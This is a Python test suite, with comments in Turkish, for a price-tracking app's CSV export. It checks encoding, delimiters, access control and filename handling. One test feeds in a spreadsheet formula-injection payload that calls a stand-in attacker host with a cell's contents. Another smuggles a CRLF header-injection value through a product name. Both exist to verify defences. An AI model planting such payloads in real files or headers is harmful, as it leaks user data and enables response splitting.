"""CSV dışa aktarma testleri (BACKLOG H1).

Kabul ölçütü "Türkçe Excel'de açınca kolonlar ayrı ve karakterler doğru"
doğrudan sınanamaz — burada Excel yok. Onun yerine Excel'in YAPTIĞI ŞEY
taklit ediliyor: dosya `utf-8-sig` ile çözülüyor (BOM'u tüketen kodek —
Excel'in BOM'a bakıp UTF-8'e geçmesinin karşılığı) ve `csv.reader` ile
noktalı virgüle göre ayrıştırılıyor. Kolonlar ayrıldıysa ve harfler
bozulmadıysa Excel de aynısını yapar.
"""
from __future__ import annotations

import csv
import io
from datetime import UTC, datetime, timedelta

import pytest
from fastapi.testclient import TestClient
from sqlalchemy.orm import sessionmaker

from keepmoney.api.app import uygulama_olustur
from keepmoney.db import get_db
from keepmoney.models import PriceReading, Product, Source, Watch
from keepmoney.servisler import disa_aktar
from keepmoney.zaman import utc_simdi


@pytest.fixture
def oturum_fabrikasi(motor):
    return sessionmaker(bind=motor)


@pytest.fixture
def istemci(oturum_fabrikasi):
    app = uygulama_olustur()

    def test_db():
        db = oturum_fabrikasi()
        try:
            yield db
        finally:
            db.close()

    app.dependency_overrides[get_db] = test_db
    with TestClient(app) as c:
        yield c


@pytest.fixture
def db(oturum_fabrikasi):
    s = oturum_fabrikasi()
    yield s
    s.close()


def kayit_ol(istemci, eposta="a@ornek.com", parola="parola1234") -> dict:
    istemci.post("/api/auth/kayit", json={"eposta": eposta, "parola": parola})
    y = istemci.post("/api/auth/giris",
                     json={"eposta": eposta, "parola": parola})
    return {"Authorization": f"Bearer {y.json()['erisim_tokeni']}"}


def izleme_ekle(istemci, basliklar, url="https://magaza.com/a", **kalan) -> int:
    return istemci.post("/api/izlemeler", headers=basliklar,
                        json={"url": url, **kalan}).json()["id"]


def excel_gibi_oku(yanit) -> list[list[str]]:
    """Excel'in yaptığını yapar: BOM'a bakıp UTF-8 çöz, `;` ile ayır."""
    metin = yanit.content.decode("utf-8-sig")
    return list(csv.reader(io.StringIO(metin), delimiter=";"))


# ─────────────── Biçim: ayraç, ondalık, BOM ───────────────

def test_dosya_bom_ile_basliyor(istemci):
    """BOM olmadan Excel dosyayı Windows-1254 sanar ve Türkçe harfleri
    bozar. Bayt düzeyinde kontrol ediliyor: `str` karşılaştırması BOM'u
    görünmez bir karakter olarak kaçırabilir."""
    b = kayit_ol(istemci)
    izleme_ekle(istemci, b)
    y = istemci.get("/api/izlemeler.csv", headers=b)
    assert y.status_code == 200
    assert y.content.startswith(b"\xef\xbb\xbf")


def test_ayrac_noktali_virgul_kolonlari_ayiriyor(istemci, db):
    """Kabul ölçütü: "Türkçe Excel'de açınca kolonlar ayrı". Virgülle
    ayrılsaydı bu ayrıştırma tek elemanlı satırlar üretirdi."""
    b = kayit_ol(istemci)
    izleme_ekle(istemci, b, hedef_fiyat=900)
    y = istemci.get("/api/izlemeler.csv", headers=b)

    satirlar = excel_gibi_oku(y)
    assert satirlar[0] == disa_aktar.LISTE_BASLIKLARI
    assert len(satirlar[0]) == 13
    assert len(satirlar[1]) == len(satirlar[0])


def test_ondalik_ayraci_virgul(istemci, db):
    """`1639.90` Türkçe Excel için METİNdir; kolon toplanmaz. Nokta HİÇ
    geçmemeli — hem hedef hem güncel fiyatta."""
    b = kayit_ol(istemci)
    izleme_ekle(istemci, b, hedef_fiyat=1500.5)
    urun = db.query(Product).one()
    urun.guncel_fiyat = 1639.9
    db.commit()

    satir = excel_gibi_oku(istemci.get("/api/izlemeler.csv", headers=b))[1]
    basliklar = disa_aktar.LISTE_BASLIKLARI
    assert satir[basliklar.index("Güncel Fiyat (TL)")] == "1639,90"
    assert satir[basliklar.index("Hedef Fiyat (TL)")] == "1500,50"


def test_turkce_karakterler_bozulmadan_iniyor(istemci, db):
    """Kabul ölçütü: "karakterler doğru". Beş Türkçe harfin hepsi + büyük
    İ — cp1254'e düşen bir dosyada bunlar `Ä±`, `ÅŸ` gibi görünür."""
    b = kayit_ol(istemci)
    izleme_ekle(istemci, b)
    urun = db.query(Product).one()
    urun.ad = "İĞÜŞÖÇ ığüşöç Kulaklık"
    db.commit()

    satir = excel_gibi_oku(istemci.get("/api/izlemeler.csv", headers=b))[1]
    assert satir[0] == "İĞÜŞÖÇ ığüşöç Kulaklık"


def test_satir_sonu_crlf(istemci):
    """RFC 4180 ve Excel'in kendi çıktısı CRLF. Tek `\\n` eski Excel
    sürümlerinde son kolonu bir alt satıra taşıyabiliyor."""
    b = kayit_ol(istemci)
    izleme_ekle(istemci, b)
    icerik = istemci.get("/api/izlemeler.csv", headers=b).content
    assert b"\r\n" in icerik
    assert icerik.replace(b"\r\n", b"").count(b"\n") == 0


def test_urun_adindaki_noktali_virgul_kolon_kaydirmiyor(istemci, db):
    """Ürün adları noktalı virgül içerebiliyor ("Kulaklık; Siyah").
    Tırnaklama yapılmazsa o satır bir kolon kayar ve dosyanın geri kalanı
    sessizce yanlış hizalanır."""
    b = kayit_ol(istemci)
    izleme_ekle(istemci, b)
    urun = db.query(Product).one()
    urun.ad = 'Kulaklık; "Siyah"'
    db.commit()

    satirlar = excel_gibi_oku(istemci.get("/api/izlemeler.csv", headers=b))
    assert satirlar[1][0] == 'Kulaklık; "Siyah"'
    assert len(satirlar[1]) == len(satirlar[0])


def test_formul_enjeksiyonu_etkisizlestiriliyor(istemci, db):
    """Ürün adı YABANCI BİR SİTEDEN kazınıyor; `=` ile başlayan bir ad
    Excel'de formül olarak çalışır (CSV enjeksiyonu). Baştaki tek tırnak
    hücreyi metne sabitler; değer KIRPILMAZ."""
    b = kayit_ol(istemci)
    izleme_ekle(istemci, b)
    urun = db.query(Product).one()
    urun.ad = '=HYPERLINK("http://kotu.example/"&A1)'
    db.commit()

    satir = excel_gibi_oku(istemci.get("/api/izlemeler.csv", headers=b))[1]
    assert satir[0] == '\'=HYPERLINK("http://kotu.example/"&A1)'


@pytest.mark.parametrize("bas", ["=", "+", "-", "@"])
def test_dort_tehlikeli_baslangicin_hepsi_kalkanli(bas):
    assert disa_aktar._metin(f"{bas}deger") == f"'{bas}deger"


def test_zararsiz_ad_degistirilmiyor():
    """Kalkan yalnızca gerçekten tehlikeli başlangıçlara uygulanmalı —
    her hücreye tırnak eklemek tüm dosyayı okunmaz hâle getirirdi."""
    assert disa_aktar._metin("Kingston HyperX") == "Kingston HyperX"
    assert disa_aktar._metin(None) == ""


def test_bos_fiyat_sifir_yazilmiyor(istemci, db):
    """Fiyatı hiç okunmamış ürüne `0` yazmak, Excel'de ortalamayı sessizce
    aşağı çeker. Boş hücre "bilinmiyor"un doğru karşılığı."""
    b = kayit_ol(istemci)
    izleme_ekle(istemci, b)                      # taranmadı: guncel_fiyat None
    satir = excel_gibi_oku(istemci.get("/api/izlemeler.csv", headers=b))[1]
    assert satir[disa_aktar.LISTE_BASLIKLARI.index("Güncel Fiyat (TL)")] == ""


def test_sinyal_ic_kod_degil_kullanici_metniyle_iniyor(istemci, db):
    """`dip` bir iç kod; kullanıcı arayüzde hiçbir yerde görmüyor
    (SinyalRozeti.tsx "90 günün dibi" yazıyor). CSV de aynı sözlüğü
    kullanmalı, yoksa aynı şey iki isimle anılır."""
    b = kayit_ol(istemci)
    izleme_ekle(istemci, b)
    urun = db.query(Product).one()
    urun.sinyal = "dip"
    db.commit()

    satir = excel_gibi_oku(istemci.get("/api/izlemeler.csv", headers=b))[1]
    assert satir[disa_aktar.LISTE_BASLIKLARI.index("Sinyal")] == "90 günün dibi"


def test_bilinmeyen_sinyal_kodu_bos_degil_ham_iniyor(istemci, db):
    """`analiz`e yeni bir sinyal eklenip `SINYAL_METNI` güncellenmezse
    kolon sessizce BOŞALMAMALI: boş hücre "bu üründe sinyal yok" demek
    olurdu, oysa sinyal VAR — yalnızca çevirisi eksik."""
    b = kayit_ol(istemci)
    izleme_ekle(istemci, b)
    urun = db.query(Product).one()
    urun.sinyal = "yeni_sinyal"
    db.commit()

    satir = excel_gibi_oku(istemci.get("/api/izlemeler.csv", headers=b))[1]
    assert satir[disa_aktar.LISTE_BASLIKLARI.index("Sinyal")] == "yeni_sinyal"


def test_sinyalsiz_urunde_kolon_bos(istemci):
    """Gerçekten sinyali olmayan üründe (henüz taranmamış) kolon boş
    kalır — yukarıdaki testin ayırdığı iki durumdan diğeri."""
    b = kayit_ol(istemci)
    izleme_ekle(istemci, b)
    satir = excel_gibi_oku(istemci.get("/api/izlemeler.csv", headers=b))[1]
    assert satir[disa_aktar.LISTE_BASLIKLARI.index("Sinyal")] == ""


# ─────────────── Geçmiş dosyası ───────────────

def test_gecmis_ham_okumalari_iceriyor(istemci, db):
    """Grafik gün başına tek nokta gösteriyor (MIMARI K4) ama dışa aktarma
    HAM veriyi veriyor: aynı günün iki okuması iki satır. Günlük özet ham
    veriden üretilebilir, tersi üretilemez."""
    b = kayit_ol(istemci)
    i = izleme_ekle(istemci, b)
    urun = db.query(Product).one()
    kaynak = db.query(Source).one()
    simdi = utc_simdi()
    for saat, fiyat in ((6, 1000.0), (2, 950.0)):
        db.add(PriceReading(product_id=urun.id, source_id=kaynak.id,
                            fiyat=fiyat, ts=simdi - timedelta(hours=saat)))
    db.commit()

    satirlar = excel_gibi_oku(
        istemci.get(f"/api/izlemeler/{i}/gecmis.csv", headers=b))
    assert satirlar[0] == disa_aktar.GECMIS_BASLIKLARI
    fiyatlar = [s[disa_aktar.GECMIS_BASLIKLARI.index("Fiyat (TL)")]
                for s in satirlar[1:]]
    # `ts` sırasına göre: önce 6 saat önceki, sonra 2 saat önceki
    assert fiyatlar == ["1000,00", "950,00"]


def test_stok_yok_okumasi_bos_fiyat_ve_hayir_ile_iniyor(istemci, db):
    """B4'ten beri STOKTA_YOK da bir okumadır (`fiyat=None,
    stokta_var=False`). "Hiç taranmadı" ile "tarandı, ürün yoktu" farkı
    grafikte gösteriliyor; CSV'de de kaybolmamalı."""
    b = kayit_ol(istemci)
    i = izleme_ekle(istemci, b)
    urun = db.query(Product).one()
    kaynak = db.query(Source).one()
    db.add(PriceReading(product_id=urun.id, source_id=kaynak.id, fiyat=None,
                        stokta_var=False, ts=utc_simdi()))
    db.commit()

    satir = excel_gibi_oku(
        istemci.get(f"/api/izlemeler/{i}/gecmis.csv", headers=b))[1]
    basliklar = disa_aktar.GECMIS_BASLIKLARI
    assert satir[basliklar.index("Fiyat (TL)")] == ""
    assert satir[basliklar.index("Stokta")] == "hayır"


def test_saat_turkiye_dilimine_cevriliyor(istemci, db):
    """Veritabanı UTC saklıyor (zaman.py), kullanıcıya gösterilen her şey
    Europe/Istanbul. 22:30 UTC, Türkiye'de ERTESİ GÜN 01:30 — ham UTC
    yazılsaydı kullanıcı "o saatte bilgisayarım kapalıydı" derdi."""
    b = kayit_ol(istemci)
    i = izleme_ekle(istemci, b)
    urun = db.query(Product).one()
    kaynak = db.query(Source).one()
    db.add(PriceReading(product_id=urun.id, source_id=kaynak.id, fiyat=100,
                        ts=datetime(2026, 3, 10, 22, 30, tzinfo=UTC)
                        .replace(tzinfo=None)))
    db.commit()

    satir = excel_gibi_oku(
        istemci.get(f"/api/izlemeler/{i}/gecmis.csv", headers=b))[1]
    basliklar = disa_aktar.GECMIS_BASLIKLARI
    assert satir[basliklar.index("Tarih")] == "11.03.2026"
    assert satir[basliklar.index("Saat")] == "01:30"


def test_gecmisi_olmayan_urun_yalniz_baslik_donuyor(istemci):
    """Hata değil: yeni eklenmiş ürünün geçmişi yoktur. Boş gövde yerine
    başlık satırı dönmeli — Excel'de açılan dosya kolonlarını göstersin."""
    b = kayit_ol(istemci)
    i = izleme_ekle(istemci, b)
    y = istemci.get(f"/api/izlemeler/{i}/gecmis.csv", headers=b)
    assert y.status_code == 200
    assert excel_gibi_oku(y) == [disa_aktar.GECMIS_BASLIKLARI]


# ─────────────── Yetki: "başkasının verisi inmiyor" ───────────────

def test_baskasinin_gecmisi_indirilemiyor(istemci, db):
    """Kabul ölçütü. 403 DEĞİL 404: "yetkin yok" cevabı o id'de bir kayıt
    OLDUĞUNU sızdırır."""
    a = kayit_ol(istemci, "a@ornek.com")
    a_izleme = izleme_ekle(istemci, a, url="https://magaza.com/gizli")

    b = kayit_ol(istemci, "b@ornek.com")
    y = istemci.get(f"/api/izlemeler/{a_izleme}/gecmis.csv", headers=b)
    assert y.status_code == 404


def test_liste_yalnizca_kendi_urunlerini_iceriyor(istemci, db):
    """Kabul ölçütü. İki kullanıcı AYNI ürünü izlese bile listeler ayrı."""
    a = kayit_ol(istemci, "a@ornek.com")
    izleme_ekle(istemci, a, url="https://magaza.com/a-urunu")
    db.query(Product).one().ad = "A KULLANICISININ URUNU"
    db.commit()

    b = kayit_ol(istemci, "b@ornek.com")
    izleme_ekle(istemci, b, url="https://magaza.com/b-urunu")

    y = istemci.get("/api/izlemeler.csv", headers=b)
    satirlar = excel_gibi_oku(y)
    assert len(satirlar) == 2                       # başlık + tek ürün
    assert "A KULLANICISININ URUNU" not in y.content.decode("utf-8-sig")


@pytest.mark.parametrize("yol", ["/api/izlemeler.csv",
                                 "/api/izlemeler/1/gecmis.csv"])
def test_oturumsuz_401(istemci, yol):
    assert istemci.get(yol).status_code == 401


# ─────────────── Paketleme: başlıklar ve dosya adı ───────────────

def test_indirilebilir_dosya_olarak_paketleniyor(istemci, db):
    """`attachment` olmadan Chrome `.csv`yi sekmede düz metin açıyor:
    kullanıcı "indir"e basıp ekran dolusu noktalı virgül görüyor."""
    b = kayit_ol(istemci)
    izleme_ekle(istemci, b)
    y = istemci.get("/api/izlemeler.csv", headers=b)
    assert y.headers["content-type"].startswith("text/csv")
    assert y.headers["content-disposition"].startswith("attachment;")
    assert y.headers["cache-control"] == "no-store"


def test_gecmis_dosya_adi_urun_adini_tasiyor(istemci, db):
    """Aksi hâlde her indirme `gecmis.csv` olurdu ve üç ürün dışa aktaran
    kullanıcının klasöründe `gecmis (1).csv`, `gecmis (2).csv` kalırdı."""
    b = kayit_ol(istemci)
    i = izleme_ekle(istemci, b)
    urun = db.query(Product).one()
    urun.ad = "Kingston HyperX Cloud II"
    db.commit()

    y = istemci.get(f"/api/izlemeler/{i}/gecmis.csv", headers=b)
    assert "kingston-hyperx-cloud-ii" in y.headers["content-disposition"]


def test_dosya_adi_turkce_ve_tirnakli_adda_da_ascii_kaliyor(istemci, db):
    """Dosya adı `Content-Disposition` başlığına giriyor ve HTTP başlıkları
    ASCII taşır. Ürün adı yabancı siteden geliyor: tırnak ya da satır sonu
    içeren bir ad, kalkan olmasa başlık enjeksiyonu olurdu."""
    b = kayit_ol(istemci)
    i = izleme_ekle(istemci, b)
    urun = db.query(Product).one()
    urun.ad = 'Kulaklık "Şık"\r\nX-Kotu: 1'
    db.commit()

    yerlesim = istemci.get(f"/api/izlemeler/{i}/gecmis.csv",
                           headers=b).headers["content-disposition"]
    assert yerlesim.isascii()
    assert '"' not in yerlesim.split("filename=")[1][1:-1]
    assert "\r" not in yerlesim and "\n" not in yerlesim
    assert "kulaklik-sik-x-kotu-1" in yerlesim


def test_slug_bos_ada_dusmuyor():
    """Adı tamamen ASCII dışı olan üründe slug boş kalırdı ve dosya adı
    `keepmoney--gecmis-...csv` olurdu."""
    assert disa_aktar.slug("日本語") == "urun"
    assert disa_aktar.slug("") == "urun"


def test_uzun_ad_dosya_adinda_kirpiliyor():
    assert len(disa_aktar.slug("a" * 200)) == 40


# ─────────────── Sorgu bütçesi ───────────────

def test_liste_csv_urun_basina_sorgu_acmiyor(istemci, db):
    """`Link` kolonu `product.sources`a bakıyor. `izlemeler()` kaynakları
    tembel bıraksaydı ürün başına BİR SELECT daha açılırdı (N+1) — 35
    ürünlük gerçek hesapta 35 ek sorgu. `kaynaklarla=True` bunu tek bir
    `selectinload` sorgusuna indiriyor; bu test sabitliği ölçüyor: ürün
    sayısı üçe katlanırken sorgu sayısı SABİT kalmalı."""
    from sqlalchemy import event

    b = kayit_ol(istemci)
    for n in range(3):
        izleme_ekle(istemci, b, url=f"https://magaza-{n}.com/urun")

    sorgular: list[str] = []
    motor = db.get_bind()

    def yakala(conn, cursor, ifade, *a, **kw):
        if ifade.lstrip().upper().startswith("SELECT"):
            sorgular.append(ifade)

    event.listen(motor, "before_cursor_execute", yakala)
    try:
        y = istemci.get("/api/izlemeler.csv", headers=b)
    finally:
        event.remove(motor, "before_cursor_execute", yakala)

    assert len(excel_gibi_oku(y)) == 4               # başlık + 3 ürün
    # kullanıcı + izlemeler + ürünler + setler + kaynaklar = 5
    assert len(sorgular) <= 5, f"{len(sorgular)} SELECT: {sorgular}"


def test_izlemeler_ucu_kaynak_sorgusu_acmiyor(istemci, db):
    """`kaynaklarla` bayrağının ASIL SEBEBİ: en sıcak sorgu yolu
    (`GET /api/izlemeler`, panelde her açılışta) o ek sorgunun bedelini
    ÖDEMEMELİ. Bayrak varsayılan olarak kapalı kalmazsa bu test kırılır."""
    from sqlalchemy import event

    b = kayit_ol(istemci)
    for n in range(3):
        izleme_ekle(istemci, b, url=f"https://magaza-{n}.com/urun")

    sorgular: list[str] = []
    motor = db.get_bind()

    def yakala(conn, cursor, ifade, *a, **kw):
        if ifade.lstrip().upper().startswith("SELECT"):
            sorgular.append(ifade)

    event.listen(motor, "before_cursor_execute", yakala)
    try:
        istemci.get("/api/izlemeler", headers=b)
    finally:
        event.remove(motor, "before_cursor_execute", yakala)

    assert not any("FROM sources" in s for s in sorgular), sorgular


# ─────────────── Rota çözümlemesi ───────────────

def test_nokta_csv_yollari_spa_geri_dususune_takilmiyor(istemci):
    """`api/statik.py`nin yakalayıcı rotası "adında nokta olan yol"u 404
    yapıyor. `.csv` uçları ondan ÖNCE eşleşmeli — yoksa arayüz derlenmiş
    hâlde sunulduğunda (üretim biçimi) indirme sessizce 404 olurdu."""
    y = istemci.get("/openapi.json").json()
    assert "/api/izlemeler.csv" in y["paths"]
    assert "/api/izlemeler/{izleme_id}/gecmis.csv" in y["paths"]


def test_izleme_id_metin_verilirse_422(istemci):
    b = kayit_ol(istemci)
    y = istemci.get("/api/izlemeler/abc/gecmis.csv", headers=b)
    assert y.status_code == 422


# ─────────────── Servis katmanı: doğrudan ───────────────

def test_csv_metni_bom_ve_baslik_uretiyor():
    metin = disa_aktar.csv_metni(["A", "B"], [["1", "2"]])
    assert metin == disa_aktar.BOM + "A;B\r\n1;2\r\n"


def test_liste_csv_kaynaksiz_urunde_bos_link_veriyor(motor):
    """Hiç kaynağı OK olmayan ürün (hepsi ENGELLİ/STOKTA_YOK) — link
    kolonu boş kalmalı, satır düşmemeli."""
    from keepmoney.models import User

    s = sessionmaker(bind=motor)()
    kullanici = User(email="x@ornek.com", password_hash="x")
    urun = Product(ad="Ürün", guncel_fiyat=100.0)
    s.add_all([kullanici, urun])
    s.flush()
    s.add(Source(product_id=urun.id, url="https://m.com/a", host="m.com",
                 son_fiyat=100.0, durum="ENGELLI"))
    izleme = Watch(user_id=kullanici.id, product_id=urun.id)
    s.add(izleme)
    s.commit()

    satirlar = list(csv.reader(
        io.StringIO(disa_aktar.liste_csv([izleme]).lstrip(disa_aktar.BOM)),
        delimiter=";"))
    s.close()
    assert len(satirlar) == 2
    assert satirlar[1][disa_aktar.LISTE_BASLIKLARI.index("Link")] == ""
